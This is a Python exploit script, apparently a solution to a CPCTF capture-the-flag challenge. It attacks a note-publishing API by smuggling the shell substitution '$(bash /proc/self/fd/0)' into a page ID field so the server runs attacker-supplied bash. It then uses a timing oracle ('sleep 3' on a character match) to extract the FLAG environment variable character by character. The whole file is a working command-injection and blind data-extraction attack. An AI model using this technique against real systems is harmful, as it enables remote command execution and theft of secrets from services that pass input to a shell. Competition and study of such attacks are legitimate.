import time
import requests

url = "https://typst-note.web.cpctf.space/api/request-publish"
headers = {"Content-Type": "application/json"}

known_prefix = "CPCTF{"
# known_prefix = "CPCTF{H!deErr0rN0t54fe"
flag = known_prefix
i = len(known_prefix)

candidates = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!{}_-"

while True:
    found_char = ""
    for c in candidates:
        content = f'[ "${{FLAG:{i}:1}}" = "{c}" ] && sleep 3'
        json_data = {"pageId": "$(bash /proc/self/fd/0)", "content": content}

        start = time.time()
        try:
            requests.post(url, json=json_data, headers=headers, timeout=10)
        except requests.exceptions.Timeout:
            pass
        end = time.time()

        elapsed = end - start

        if elapsed > 2:
            flag += c
            found_char = c
            print(f"[+] Found char '{c}' => {flag}")
            i += 1
            break

        time.sleep(0.5)

    if found_char == "}":
        break

    if not found_char:
        print(f"[!] Could not find char at position {i}. Current flag: {flag}")
        break
